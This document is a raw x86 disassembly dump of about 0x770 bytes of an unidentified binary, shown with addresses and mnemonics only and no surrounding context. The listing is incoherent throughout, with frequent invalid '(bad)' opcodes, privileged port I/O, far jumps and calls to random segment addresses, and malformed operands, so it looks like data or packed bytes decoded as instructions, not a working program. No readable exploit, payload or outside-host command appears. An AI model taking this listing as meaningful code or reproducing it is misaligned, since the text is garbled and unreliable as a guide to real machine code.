  40b8ee:	test   eax,ecx
  40b8f0:	(bad)  
  40b8f1:	call   0xbefce54a
  40b8f6:	les    ebp,FWORD PTR [ebx]
  40b8f8:	push   edi
  40b8f9:	jp     0x40b960
  40b8fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8fc:	jge    0x40b8df
  40b8fe:	dec    esp
  40b8ff:	inc    ebx
  40b900:	fbstp  TBYTE PTR [esi-0x64]
  40b903:	loopne 0x40b900
  40b905:	mov    edi,DWORD PTR [edi-0x65371cf9]
  40b90b:	jl     0x40b979
  40b90d:	xor    DWORD PTR [ecx-0x1ca05d64],eax
  40b913:	lods   al,BYTE PTR ds:[esi]
  40b914:	dec    ebp
  40b915:	in     eax,0x46
  40b917:	jae    0x40b8b3
  40b919:	xchg   BYTE PTR [esi+0x5441758],ch
  40b91f:	mov    ebx,0xd52cfd90
  40b924:	cmp    esi,DWORD PTR [edi+0xa]
  40b927:	fsubr  st,st(7)
  40b929:	into   
  40b92a:	or     eax,0x648b8faa
  40b92f:	in     eax,0xcc
  40b931:	imul   ebx,DWORD PTR ds:0x6263922c,0x75
  40b938:	sahf   
  40b939:	mov    ds:0xee795b67,eax
  40b93e:	out    0x1,al
  40b940:	inc    ecx
  40b941:	jle    0x40b905
  40b943:	(bad)  
  40b944:	nop
  40b945:	(bad)  
  40b946:	inc    edi
  40b947:	xchg   DWORD PTR [ecx-0x6476f0c2],edi
  40b94d:	dec    ebp
  40b94e:	fidivr WORD PTR [eax+0x12]
  40b951:	icebp  
  40b952:	jle    0x40b9ab
  40b954:	adc    eax,DWORD PTR [edi+0x61ca2b73]
  40b95a:	das    
  40b95b:	xlat   BYTE PTR ds:[ebx]
  40b95c:	div    DWORD PTR [ecx-0x3c]
  40b95f:	aam    0x76
  40b961:	push   edi
  40b962:	xchg   ebx,eax
  40b963:	or     al,0x3e
  40b965:	test   eax,0x94c715b3
  40b96a:	fimul  WORD PTR [ebp-0x1e]
  40b96d:	into   
  40b96e:	sub    eax,0x44afad49
  40b973:	clc    
  40b974:	mov    al,dl
  40b976:	sbb    eax,0x7b11fb55
  40b97b:	add    BYTE PTR [edi],cl
  40b97d:	scas   al,BYTE PTR es:[edi]
  40b97e:	jl     0x40b9e7
  40b980:	inc    ebx
  40b981:	test   DWORD PTR cs:[esi-0x21cb9446],ecx
  40b988:	add    DWORD PTR [eax+0x76],esi
  40b98b:	(bad)  [ebx+0x5297f035]
  40b991:	xor    DWORD PTR [eax],0x2d
  40b994:	leave  
  40b995:	mov    dl,0xfe
  40b997:	loop   0x40b92d
  40b999:	ins    DWORD PTR es:[edi],dx
  40b99a:	adc    DWORD PTR [edi],ecx
  40b99c:	nop
  40b99d:	inc    edi
  40b99e:	mov    al,0xd4
  40b9a0:	sub    ebx,edi
  40b9a2:	leave  
  40b9a3:	stc    
  40b9a4:	inc    edx
  40b9a5:	push   esi
  40b9a6:	popa   
  40b9a7:	pop    edi
  40b9a8:	push   eax
  40b9a9:	sahf   
  40b9aa:	fbld   TBYTE PTR [eax]
  40b9ac:	test   al,0xb7
  40b9ae:	in     al,dx
  40b9af:	out    0xd8,eax
  40b9b1:	inc    ecx
  40b9b2:	aas    
  40b9b3:	cld    
  40b9b4:	mov    ch,0xb3
  40b9b6:	pop    ebx
  40b9b7:	add    ebx,DWORD PTR [edx]
  40b9b9:	jne    0x40b9c9
  40b9bb:	out    0xc1,eax
  40b9bd:	push   edx
  40b9be:	call   0x416d6543
  40b9c3:	cmp    ebx,ebp
  40b9c5:	mov    ebp,0x3d89a1ee
  40b9ca:	pop    ebp
  40b9cb:	rol    BYTE PTR [esi-0x1e],0x6b
  40b9cf:	jp     0x40b9c3
  40b9d1:	fdivr  DWORD PTR [ebx+ebp*2+0x6842c334]
  40b9d8:	adc    eax,0x468b00fc
  40b9dd:	add    edi,DWORD PTR [ebx-0x52b1fab4]
  40b9e3:	nop
  40b9e4:	out    dx,eax
  40b9e5:	pop    edi
  40b9e6:	pusha  
  40b9e7:	dec    eax
  40b9e8:	ret    
  40b9e9:	adc    esp,DWORD PTR [eax]
  40b9eb:	(bad)  
  40b9ec:	adc    dl,bl
  40b9ee:	fist   DWORD PTR [edx+0x17e65727]
  40b9f4:	loop   0x40b9c8
  40b9f6:	mov    dh,0x2a
  40b9f8:	xor    esi,esi
  40b9fa:	pop    esp
  40b9fb:	dec    esi
  40b9fc:	clc    
  40b9fd:	jae    0x40ba53
  40b9ff:	dec    ecx
  40ba00:	cmp    edx,esi
  40ba02:	fimul  DWORD PTR [ecx]
  40ba04:	cmp    edi,DWORD PTR [edi+0xc]
  40ba07:	mov    esp,DWORD PTR [esi+0xdbbf4e3]
  40ba0d:	or     dh,BYTE PTR [ecx-0x41]
  40ba10:	inc    edx
  40ba11:	(bad)  
  40ba12:	jb     0x40b9a1
  40ba14:	je     0x40b9c0
  40ba16:	push   ebx
  40ba17:	in     eax,dx
  40ba18:	fs mov edx,0xe680a567
  40ba1e:	retf   
  40ba1f:	iret   
  40ba20:	sub    al,0xb5
  40ba22:	sub    ch,dh
  40ba24:	aam    0xa3
  40ba26:	cmp    DWORD PTR [esi+0xed74d68],eax
  40ba2c:	not    BYTE PTR [edx+0x69]
  40ba2f:	and    BYTE PTR [ebx-0x44],cl
  40ba32:	jns    0x40ba1e
  40ba34:	cs int 0x92
  40ba37:	(bad)  
  40ba38:	rol    BYTE PTR [edx+0x50],0xe0
  40ba3c:	xor    dh,BYTE PTR [edx-0x6e]
  40ba3f:	pop    es
  40ba40:	dec    edx
  40ba41:	sbb    ebp,ecx
  40ba43:	fisubr WORD PTR [esi]
  40ba45:	pop    ebp
  40ba46:	inc    edx
  40ba47:	inc    ebx
  40ba48:	xchg   ebx,eax
  40ba49:	jmp    0xf5b10ea1
  40ba4e:	jecxz  0x40ba97
  40ba50:	ds xchg ebp,eax
  40ba52:	loope  0x40ba27
  40ba54:	and    edi,DWORD PTR [edx]
  40ba56:	push   ds
  40ba57:	int3   
  40ba58:	sub    bh,BYTE PTR [ebx-0x29]
  40ba5b:	cld    
  40ba5c:	clc    
  40ba5d:	xor    ecx,edx
  40ba5f:	push   ss
  40ba60:	inc    esp
  40ba61:	add    DWORD PTR cs:[edx+0x19],ebp
  40ba65:	repnz mov ebp,0x4232fdf
  40ba6b:	mov    ah,bh
  40ba6d:	pop    ebx
  40ba6e:	mov    al,ds:0xd9173534
  40ba73:	push   ebp
  40ba74:	sub    ch,dl
  40ba76:	retf   0x79fa
  40ba79:	and    edi,DWORD PTR [ebx-0x7c]
  40ba7c:	cmp    bl,cl
  40ba7e:	pop    ds
  40ba7f:	jnp    0x40ba3c
  40ba81:	sbb    al,ah
  40ba83:	adc    ch,bl
  40ba85:	and    eax,0x2ffb54b0
  40ba8a:	outs   dx,BYTE PTR ds:[esi]
  40ba8b:	call   0xa5489b75
  40ba90:	aad    0xe7
  40ba92:	(bad)  
  40ba93:	mov    edi,DWORD PTR ds:0x1d1fdcf6
  40ba99:	out    dx,al
  40ba9a:	test   al,0xca
  40ba9c:	adc    al,ah
  40ba9e:	push   ebp
  40ba9f:	cwde   
  40baa0:	dec    ecx
  40baa1:	ss in  al,0x30
  40baa4:	push   edx
  40baa5:	popf   
  40baa6:	inc    ecx
  40baa7:	pop    ss
  40baa8:	fsub   DWORD PTR [ebp+ebp*1-0x3a]
  40baac:	jo     0x40bab5
  40baae:	ret    
  40baaf:	and    DWORD PTR ss:[edi],edi
  40bab2:	test   DWORD PTR [esi],0xafc1be04
  40bab8:	ja     0x40ba7e
  40baba:	mov    bh,0xd7
  40babc:	jnp    0x40ba9b
  40babe:	sub    ecx,DWORD PTR [edi+0x7e]
  40bac1:	sbb    dl,bh
  40bac3:	popf   
  40bac4:	dec    ecx
  40bac5:	idiv   DWORD PTR [ecx-0x134a7dac]
  40bacb:	cdq    
  40bacc:	lea    edi,[ebx-0x156f002a]
  40bad2:	xor    eax,0x14044bad
  40bad7:	xchg   DWORD PTR [eax+edi*8-0x56],ebp
  40badb:	iret   
  40badc:	rcl    dl,cl
  40bade:	or     eax,0x6500b7dd
  40bae3:	sbb    bl,dh
  40bae5:	push   cs
  40bae6:	mov    ebp,0xb32e576b
  40baeb:	fwait
  40baec:	adc    esi,DWORD PTR [ebx]
  40baee:	not    BYTE PTR [ecx+0x104c8e6c]
  40baf4:	out    dx,al
  40baf5:	jl     0x40ba7f
  40baf7:	rcl    DWORD PTR [edi-0x6b5af28e],1
  40bafd:	jbe    0x40bb56
  40baff:	add    ebp,eax
  40bb01:	repz add DWORD PTR [ecx],ebx
  40bb04:	xchg   esi,eax
  40bb05:	cmp    dl,BYTE PTR [esi]
  40bb07:	adc    al,0xbe
  40bb09:	mov    WORD PTR [ebp-0x24c42318],cs
  40bb0f:	xchg   edx,eax
  40bb10:	ja     0x40baef
  40bb12:	inc    edx
  40bb13:	sbb    eax,0xc60a349e
  40bb18:	pop    ecx
  40bb19:	out    0xa3,eax
  40bb1b:	cmp    al,0x38
  40bb1d:	or     eax,0xb64e91dd
  40bb22:	xchg   edi,eax
  40bb23:	mov    ds:0x5b8ad54d,al
  40bb28:	scas   eax,DWORD PTR es:[edi]
  40bb29:	inc    esp
  40bb2a:	aaa    
  40bb2b:	dec    ecx
  40bb2c:	cli    
  40bb2d:	add    al,0x7e
  40bb2f:	push   esi
  40bb30:	pushf  
  40bb31:	cmp    eax,0x97327178
  40bb36:	mov    DWORD PTR [eax],ebp
  40bb38:	jbe    0x40bb34
  40bb3a:	xlat   BYTE PTR ds:[ebx]
  40bb3b:	rcr    BYTE PTR [ecx+0x70f3abff],1
  40bb41:	sub    al,0x67
  40bb43:	xchg   edi,eax
  40bb44:	add    ecx,DWORD PTR [edx-0x52]
  40bb47:	mov    esp,0x3a35e770
  40bb4c:	mov    eax,0xae87a793
  40bb51:	(bad)  
  40bb52:	mov    esp,0x3bb80a5f
  40bb57:	outs   dx,DWORD PTR ds:[esi]
  40bb58:	adc    dh,bl
  40bb5a:	adc    al,0x90
  40bb5c:	cs fsubp st(1),st
  40bb5f:	sub    DWORD PTR [ebp+ebp*1+0x51815d17],edx
  40bb66:	push   ss
  40bb67:	sub    esp,DWORD PTR [edi-0x56]
  40bb6a:	xor    eax,0x2abc949c
  40bb6f:	in     eax,0x5f
  40bb71:	xlat   BYTE PTR ds:[ebx]
  40bb72:	sbb    eax,edi
  40bb74:	hlt    
  40bb75:	dec    ecx
  40bb76:	shl    BYTE PTR [edx-0x18],cl
  40bb79:	jne    0x40bb7e
  40bb7b:	adc    dh,BYTE PTR [esi-0x6d4c7408]
  40bb81:	xor    al,0x92
  40bb83:	out    dx,al
  40bb84:	mov    ?,WORD PTR [ebp-0x7e37aec3]
  40bb8a:	loop   0x40bb57
  40bb8c:	dec    ebp
  40bb8d:	fmul   DWORD PTR [ebx+edx*1+0x3d]
  40bb91:	or     al,0x3b
  40bb93:	aad    0x7f
  40bb95:	push   ss
  40bb96:	adc    al,bl
  40bb98:	push   ss
  40bb99:	sti    
  40bb9a:	icebp  
  40bb9b:	mov    al,0x7b
  40bb9d:	loopne 0x40bc1c
  40bb9f:	stc    
  40bba0:	cmp    BYTE PTR [edi-0x2653479f],bh
  40bba6:	xchg   BYTE PTR [esi-0x77],bh
  40bba9:	jl     0x40bbf3
  40bbab:	aad    0x83
  40bbad:	jmp    0x2749dc2e
  40bbb2:	cs add al,0x5a
  40bbb5:	jmp    0x40bb4e
  40bbb7:	inc    ebp
  40bbb8:	call   0x7d98:0x1da1a4a1
  40bbbf:	jnp    0x40bb9b
  40bbc1:	or     DWORD PTR [eax+0x38444fb9],0x2b52add5
  40bbcb:	cmp    DWORD PTR [edi],esi
  40bbcd:	or     bh,ah
  40bbcf:	scas   al,BYTE PTR es:[edi]
  40bbd0:	aad    0xac
  40bbd2:	sub    BYTE PTR [ecx],cl
  40bbd4:	mov    ebx,0xd1406761
  40bbd9:	sbb    al,0x11
  40bbdb:	test   edx,ecx
  40bbdd:	pop    ds
  40bbde:	push   cs
  40bbdf:	mov    ds:0x6c05fe0,eax
  40bbe4:	inc    ebx
  40bbe5:	aad    0xe3
  40bbe7:	fidiv  DWORD PTR [edx+esi*4+0x45ea82e7]
  40bbee:	mov    ah,BYTE PTR [ebp-0x5f174228]
  40bbf4:	ret    0x402
  40bbf7:	adc    al,0x79
  40bbf9:	ret    0xc02a
  40bbfc:	cmp    dl,BYTE PTR [edx+0x20408216]
  40bc02:	ds or  al,0x83
  40bc05:	or     DWORD PTR [edi],edx
  40bc07:	rol    edi,1
  40bc09:	scas   al,BYTE PTR es:[edi]
  40bc0a:	les    eax,FWORD PTR [esi-0x5b0413]
  40bc10:	and    ecx,0xffffffb8
  40bc13:	dec    eax
  40bc14:	fst    QWORD PTR [esi-0x4e03c434]
  40bc1a:	fmul   DWORD PTR [ecx-0x3f]
  40bc1d:	retf   0x4bad
  40bc20:	mov    ecx,0x5ae2b16
  40bc25:	test   BYTE PTR [ebx-0x419c0998],bl
  40bc2b:	rcr    DWORD PTR [esi+0x50],cl
  40bc2e:	dec    ebx
  40bc2f:	jmp    0x946c:0x539d22b3
  40bc36:	test   DWORD PTR [ebx-0x12],edx
  40bc39:	call   0xdc8a:0x6e5325d
  40bc40:	mov    ebp,0x7d28a991
  40bc45:	mov    eax,ds:0xf855ff1a
  40bc4a:	add    eax,esp
  40bc4c:	inc    esp
  40bc4d:	pop    ds
  40bc4e:	fstp   DWORD PTR [eax-0x3b429081]
  40bc54:	xchg   esp,eax
  40bc55:	jp     0x40bbe5
  40bc57:	mov    esp,0x9a4b693f
  40bc5c:	mov    dh,0xd
  40bc5f:	jb     0x40bbf5
  40bc61:	xchg   ecx,eax
  40bc62:	sub    al,0xdd
  40bc64:	push   ecx
  40bc65:	adc    dh,ah
  40bc67:	mov    ebx,0x3e2bb339
  40bc6c:	xchg   ebp,eax
  40bc6d:	adc    al,cl
  40bc6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc70:	popf   
  40bc71:	mov    ebx,0xee0ca18d
  40bc76:	jne    0x40bcf5
  40bc78:	sbb    DWORD PTR [edi+0x6d8e068f],edx
  40bc7e:	xor    DWORD PTR [edx],0x85a63ca6
  40bc84:	lock dec edx
  40bc86:	pop    ecx
  40bc87:	pop    ss
  40bc88:	add    al,0xc4
  40bc8a:	lea    ebx,[edx+0x6c]
  40bc8d:	jp     0x40bca0
  40bc8f:	icebp  
  40bc90:	mov    ebx,0x2e61bed4
  40bc95:	je     0x40bc80
  40bc97:	ja     0x40bcd1
  40bc99:	dec    ecx
  40bc9a:	xchg   edx,eax
  40bc9b:	pop    eax
  40bc9c:	and    DWORD PTR [ecx],edi
  40bc9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc9f:	ja     0x40bc9c
  40bca1:	call   0x506c2378
  40bca6:	out    0x80,eax
  40bca8:	inc    ebx
  40bca9:	push   eax
  40bcaa:	adc    BYTE PTR [edx+0x28e9ee9c],ah
  40bcb0:	pop    ss
  40bcb1:	test   DWORD PTR [esi+0x1f],edx
  40bcb4:	mov    eax,0xf13da70c
  40bcb9:	mov    ah,0x55
  40bcbb:	sbb    DWORD PTR [edx],ebp
  40bcbd:	ret    0x198e
  40bcc0:	cmp    eax,0x5fcaa9f6
  40bcc5:	add    al,0x8d
  40bcc7:	repz sbb DWORD PTR [edi],ebp
  40bcca:	pop    edx
  40bccb:	sub    DWORD PTR [ebx],esi
  40bccd:	fst    st(2)
  40bccf:	daa    
  40bcd0:	pop    esi
  40bcd1:	xor    ah,0xb8
  40bcd4:	std    
  40bcd5:	mov    WORD PTR [eax*2+0x65e6d341],es
  40bcdc:	dec    BYTE PTR [eax]
  40bcde:	dec    ecx
  40bcdf:	push   edx
  40bce0:	and    bl,BYTE PTR [ebx]
  40bce2:	loopne 0x40bcac
  40bce4:	dec    edi
  40bce5:	out    0x20,eax
  40bce7:	aam    0x12
  40bce9:	aad    0x9a
  40bceb:	lods   eax,DWORD PTR ds:[esi]
  40bcec:	mov    bl,0x1b
  40bcee:	xor    esi,ebx
  40bcf0:	dec    esi
  40bcf1:	pop    eax
  40bcf2:	out    0x7d,eax
  40bcf4:	inc    ebp
  40bcf5:	scas   eax,DWORD PTR es:[edi]
  40bcf6:	inc    ecx
  40bcf7:	add    al,0xf8
  40bcf9:	das    
  40bcfa:	pop    ebp
  40bcfb:	push   esi
  40bcfc:	sub    BYTE PTR [ebx+eax*8-0x20],bh
  40bd00:	mov    bl,0x32
  40bd02:	icebp  
  40bd03:	jnp    0x40bcfa
  40bd05:	xor    al,0xb5
  40bd07:	aam    0xc6
  40bd09:	push   ebx
  40bd0a:	test   eax,0x3b7e2643
  40bd0f:	adc    ebx,DWORD PTR [eax+0x421e927f]
  40bd15:	lahf   
  40bd16:	imul   ecx,esi,0x2e
  40bd19:	loope  0x40bd3f
  40bd1b:	jbe    0x40bd7d
  40bd1d:	cmp    eax,0x1fb62b52
  40bd22:	test   eax,0x93b4e59c
  40bd27:	sub    ah,BYTE PTR [edi+0x12830954]
  40bd2d:	jmp    0xb556:0x6b0135e2
  40bd34:	es dec edi
  40bd36:	pop    edi
  40bd37:	cli    
  40bd38:	push   es
  40bd39:	or     ah,BYTE PTR ds:0x593a963f
  40bd3f:	dec    ebx
  40bd40:	lds    esp,FWORD PTR [ebx-0x34]
  40bd43:	mov    edx,DWORD PTR [ebx+0x7b]
  40bd46:	outs   dx,BYTE PTR ds:[esi]
  40bd47:	(bad)  
  40bd49:	aas    
  40bd4a:	ret    
  40bd4b:	js     0x40bda2
  40bd4d:	xchg   edx,eax
  40bd4e:	fisttp WORD PTR [ebp-0x75]
  40bd51:	add    eax,0xfb5e4c23
  40bd56:	(bad)  
  40bd58:	inc    ecx
  40bd59:	xchg   edi,eax
  40bd5a:	mov    dl,0xc4
  40bd5c:	das    
  40bd5d:	dec    eax
  40bd5e:	popa   
  40bd5f:	lea    eax,[edx]
  40bd61:	add    ch,BYTE PTR [ecx-0x23]
  40bd64:	leave  
  40bd65:	in     al,dx
  40bd66:	and    BYTE PTR [eax+0x4a289cc7],bh
  40bd6c:	in     al,dx
  40bd6d:	dec    edi
  40bd6e:	addr16 cli 
  40bd70:	fs fcomip st,st(3)
  40bd73:	popa   
  40bd74:	jmp    0xa92c15e3
  40bd79:	shl    BYTE PTR [ebx],0x7d
  40bd7c:	shr    DWORD PTR [esi],cl
  40bd7e:	out    0x26,al
  40bd80:	in     al,dx
  40bd81:	rcl    al,0xe8
  40bd84:	mov    ds:0x78a56b29,eax
  40bd89:	add    al,0xd
  40bd8b:	mov    ds:0x82e1714e,al
  40bd90:	and    DWORD PTR [esi+0x7d],0x87bf9c17
  40bd97:	pop    es
  40bd98:	and    DWORD PTR [ecx+0x15],ecx
  40bd9b:	sub    ch,cl
  40bd9d:	sub    BYTE PTR [ebx+0x1a34a894],al
  40bda3:	push   ds
  40bda4:	popf   
  40bda5:	pop    edx
  40bda6:	stos   DWORD PTR es:[edi],eax
  40bda7:	cs xchg ebx,eax
  40bda9:	pop    edi
  40bdaa:	out    0x22,al
  40bdac:	repnz jmp 0x657a:0x2d018c29
  40bdb4:	sbb    DWORD PTR [edi-0x73ec3ac8],ecx
  40bdba:	fcom   QWORD PTR [edi]
  40bdbc:	inc    edx
  40bdbd:	ret    
  40bdbe:	mov    ch,0x81
  40bdc0:	mov    bl,BYTE PTR [esi]
  40bdc2:	jae    0x40bd7a
  40bdc4:	ins    DWORD PTR es:[edi],dx
  40bdc5:	and    bl,BYTE PTR [eax+eax*8+0x12674018]
  40bdcc:	addr16 push ds
  40bdce:	xor    BYTE PTR [esp+ebx*1],bh
  40bdd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdd2:	adc    DWORD PTR [edx-0x2edd5309],edi
  40bdd8:	push   eax
  40bdd9:	stos   DWORD PTR es:[edi],eax
  40bdda:	mov    al,0x44
  40bddc:	js     0x40be1a
  40bdde:	dec    ebp
  40bddf:	ret    0x3e
  40bde2:	add    DWORD PTR [edi+eiz*8+0x63cd1305],0x7562cdf5
  40bded:	add    al,0x91
  40bdef:	inc    eax
  40bdf0:	lahf   
  40bdf1:	adc    BYTE PTR [edx+0x3c],0x2c
  40bdf5:	xchg   ecx,eax
  40bdf6:	dec    edi
  40bdf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdf8:	sar    BYTE PTR [ebx+0x53197ad7],1
  40bdfe:	aas    
  40bdff:	push   ebx
  40be00:	aaa    
  40be01:	add    DWORD PTR [edi],0x32538860
  40be07:	cmp    edi,DWORD PTR [esi+0x3d]
  40be0a:	nop
  40be0b:	sbb    esp,esp
  40be0d:	jmp    eax
  40be0f:	(bad)  
  40be11:	dec    edi
  40be12:	(bad)  
  40be13:	(bad)  
  40be14:	in     al,0xa
  40be16:	lods   eax,DWORD PTR ds:[esi]
  40be17:	inc    esi
  40be18:	adc    edx,DWORD PTR [edx+0xd]
  40be1b:	into   
  40be1c:	mov    BYTE PTR [esi+0x4c],ch
  40be1f:	jno    0x40be93
  40be21:	ftst   
  40be23:	push   ebx
  40be24:	ret    0x69e5
  40be27:	lds    ebp,FWORD PTR [edx+0x32]
  40be2a:	mov    ebp,0x9183a37c
  40be2f:	mov    DWORD PTR [ecx+0x3a],ecx
  40be32:	push   esp
  40be33:	dec    esp
  40be34:	mov    dh,0x1f
  40be36:	int    0xf
  40be38:	xor    esi,DWORD PTR [edx]
  40be3a:	xchg   BYTE PTR [edx-0x789b451f],cl
  40be40:	cdq    
  40be41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be42:	sti    
  40be43:	mov    ch,bl
  40be45:	sbb    BYTE PTR [ebx],dh
  40be47:	add    ebx,DWORD PTR [edx+0x24]
  40be4a:	xor    BYTE PTR [eax+eax*8-0x62e665cc],0x24
  40be52:	scas   al,BYTE PTR es:[edi]
  40be53:	lahf   
  40be54:	push   ecx
  40be55:	aas    
  40be56:	iret   
  40be57:	ja     0x40becf
  40be59:	jb     0x40be82
  40be5b:	mov    ebp,0xbdaca0fa
  40be60:	inc    ecx
  40be61:	xchg   ecx,eax
  40be62:	jg     0x40be48
  40be64:	xchg   edx,eax
  40be65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be66:	push   esi
  40be67:	gs gs mov dh,0xbe
  40be6b:	popf   
  40be6c:	test   dh,dl
  40be6e:	mov    esi,ecx
  40be70:	ror    bh,1
  40be72:	dec    eax
  40be73:	arpl   WORD PTR [edx],dx
  40be75:	sbb    eax,DWORD PTR [esi-0x5c]
  40be78:	mov    dl,0x20
  40be7a:	mov    edx,edi
  40be7c:	and    dl,BYTE PTR ds:0xd5ef7faf
  40be82:	sar    DWORD PTR [esi-0x7508511],1
  40be88:	inc    esp
  40be89:	adc    DWORD PTR [edx],0x6f9ee08d
  40be8f:	sti    
  40be90:	call   DWORD PTR [ecx-0x4d]
  40be93:	mov    ebp,0xe96c6e5a
  40be98:	in     eax,0xbf
  40be9a:	sub    bh,BYTE PTR ds:0xe907287f
  40bea0:	mov    dh,BYTE PTR [esi-0x1e]
  40bea3:	dec    ebx
  40bea4:	mov    ds:0x394fdf86,eax
  40bea9:	das    
  40beaa:	mov    BYTE PTR [edx-0x42],cl
  40bead:	aad    0xe6
  40beaf:	push   0x1815d136
  40beb4:	repnz (bad) 
  40beb6:	jg     0x40be62
  40beb8:	sub    eax,0x278afce7
  40bebd:	lods   al,BYTE PTR ds:[esi]
  40bebe:	fstp   TBYTE PTR [edx+ebx*4-0x5937920b]
  40bec5:	neg    DWORD PTR [ecx]
  40bec7:	aas    
  40bec8:	pushf  
  40bec9:	or     BYTE PTR [ebx-0x63],dh
  40becc:	fmul   st,st(0)
  40bece:	cmc    
  40becf:	dec    ebx
  40bed0:	jbe    0x40bece
  40bed2:	xor    ecx,DWORD PTR [ebp-0x360fa378]
  40bed8:	mov    esi,0x7f8673e
  40bedd:	push   esi
  40bede:	cmp    bh,bh
  40bee0:	call   0xdc886075
  40bee5:	sub    al,0xc9
  40bee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bee8:	mov    al,ds:0x914a46d4
  40beed:	stos   DWORD PTR es:[edi],eax
  40beee:	cmp    DWORD PTR fs:[ebp-0xff151af],ebx
  40bef5:	cmp    DWORD PTR [edx],0xb83821e8
  40befb:	data16 and BYTE PTR [esp+ebx*4+0x1f30ed74],cl
  40bf03:	sbb    eax,0x11fab133
  40bf08:	mov    al,0xf6
  40bf0a:	or     ebx,esi
  40bf0c:	mov    esp,ebp
  40bf0e:	dec    ecx
  40bf0f:	jnp    0x40becc
  40bf11:	fcmovb st,st(1)
  40bf13:	cmp    BYTE PTR [edx+edi*4+0x24],bl
  40bf17:	or     eax,0xe35ba590
  40bf1c:	test   BYTE PTR ds:0xbe244e59,dl
  40bf22:	loope  0x40bf38
  40bf24:	xchg   ebp,eax
  40bf25:	scas   al,BYTE PTR es:[edi]
  40bf26:	push   eax
  40bf27:	xchg   ecx,eax
  40bf28:	inc    esp
  40bf29:	and    DWORD PTR [ebx+esi*1],esi
  40bf2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf2d:	pop    ds
  40bf2e:	mov    ebp,0x6e26d12b
  40bf33:	add    eax,0xa787504d
  40bf38:	mov    cl,0x20
  40bf3a:	ja     0x40bf8d
  40bf3c:	cld    
  40bf3d:	inc    edi
  40bf3e:	jno    0x40befe
  40bf40:	jmp    0xd6147873
  40bf45:	stc    
  40bf46:	call   0xdc81:0x737a6134
  40bf4d:	retf   
  40bf4e:	xchg   edx,eax
  40bf4f:	(bad)  
  40bf50:	and    dh,al
  40bf52:	jg     0x40bf65
  40bf54:	(bad)  
  40bf55:	frstor [esi-0x64efd021]
  40bf5b:	out    0xb4,al
  40bf5d:	cmp    BYTE PTR [ebp+0x7fa830de],bl
  40bf63:	pop    ebp
  40bf64:	pop    eax
  40bf65:	pop    ss
  40bf66:	pop    esp
  40bf67:	xlat   BYTE PTR ds:[ebx]
  40bf68:	fcom   DWORD PTR [edx]
  40bf6a:	and    edi,DWORD PTR [esi+0x13]
  40bf6d:	cmp    eax,0x56af4201
  40bf72:	in     eax,dx
  40bf73:	test   DWORD PTR [edx],ebp
  40bf75:	xchg   ecx,eax
  40bf76:	pop    ds
  40bf77:	dec    BYTE PTR [edi+0x43]
  40bf7a:	lods   al,BYTE PTR ds:[esi]
  40bf7b:	cmp    al,0xc2
  40bf7d:	fnstsw WORD PTR [edi-0x6bbe7868]
  40bf83:	mov    ch,dl
  40bf85:	(bad)  
  40bf86:	int3   
  40bf87:	(bad)  
  40bf8a:	mov    esi,0xb5204b66
  40bf8f:	sbb    DWORD PTR [eax+eax*8+0x3dea872d],0xfd41d552
  40bf9a:	(bad)  
  40bf9b:	imul   ebx,DWORD PTR [edi+0x20],0x50fa8d7f
  40bfa2:	xchg   ebp,eax
  40bfa3:	mov    esi,0x34024aa3
  40bfa8:	adc    al,0x4f
  40bfaa:	xchg   DWORD PTR [eax],edx
  40bfac:	ret    
  40bfad:	test   bh,dh
  40bfaf:	ins    BYTE PTR es:[edi],dx
  40bfb0:	call   0xeb56:0xeed8c167
  40bfb7:	jne    0x40bf8d
  40bfb9:	(bad)  
  40bfba:	xchg   esp,eax
  40bfbb:	dec    edi
  40bfbc:	adc    al,0xee
  40bfbe:	rcl    BYTE PTR [ecx+0x37],cl
  40bfc1:	push   ds
  40bfc2:	cmp    BYTE PTR [edi-0x6985fdb4],dh
  40bfc8:	sbb    al,0x24
  40bfca:	push   0x672b58b1
  40bfcf:	jnp    0x40c037
  40bfd1:	popa   
  40bfd2:	stos   BYTE PTR es:[edi],al
  40bfd3:	sbb    DWORD PTR [ecx],eax
  40bfd5:	scas   al,BYTE PTR es:[edi]
  40bfd6:	xchg   edi,eax
  40bfd7:	dec    eax
  40bfd8:	cmp    al,bl
  40bfda:	loopne 0x40c02c
  40bfdc:	and    eax,0x91d6abb5
  40bfe1:	fs iret 
  40bfe3:	in     al,0x93
  40bfe5:	outs   dx,BYTE PTR ds:[esi]
  40bfe6:	mov    ds:0x52e1f377,eax
  40bfeb:	stos   DWORD PTR es:[edi],eax
  40bfec:	lock aad 0x83
  40bfef:	(bad)  
  40bff0:	ins    BYTE PTR es:[edi],dx
  40bff1:	call   0x7ba54fd2
  40bff6:	and    eax,0x257c261a
  40bffb:	sub    BYTE PTR ds:0x8ae3cbbe,dl
  40c001:	shl    DWORD PTR [esi-0x4],0xef
  40c005:	jb     0x40c07b
  40c007:	mov    bh,0x26
  40c009:	or     al,BYTE PTR [esi+esi*2+0x67b649c8]
  40c010:	sar    esi,cl
  40c012:	and    BYTE PTR [ebp+0x6f7c345f],0x53
  40c019:	fdiv   DWORD PTR [eax-0x61]
  40c01c:	adc    cl,cl
  40c01e:	int    0x7
  40c020:	sbb    ebx,DWORD PTR [ebx]
  40c022:	sub    ah,dh
  40c024:	test   eax,0xd7dac421
  40c029:	mov    eax,ds:0x5049d32a
  40c02e:	adc    BYTE PTR [edi+0x7818128e],0xe0
  40c035:	xor    esi,0x12
  40c038:	mov    cl,0xb9
  40c03a:	mov    BYTE PTR [ebp-0x1e1ecb12],bl
  40c040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c041:	ins    DWORD PTR es:[edi],dx
  40c042:	jbe    0x40c047
  40c044:	xchg   dl,ah
  40c046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c047:	mov    bl,0x98
  40c049:	loopne 0x40c0b1
  40c04b:	mov    al,ds:0xa11f18e2
  40c050:	call   0xc32f:0x5e1a8ecc
  40c057:	jmp    0xb9d0:0xdf49b396
  40c05e:	xchg   ebx,eax
  40c05f:	inc    edx
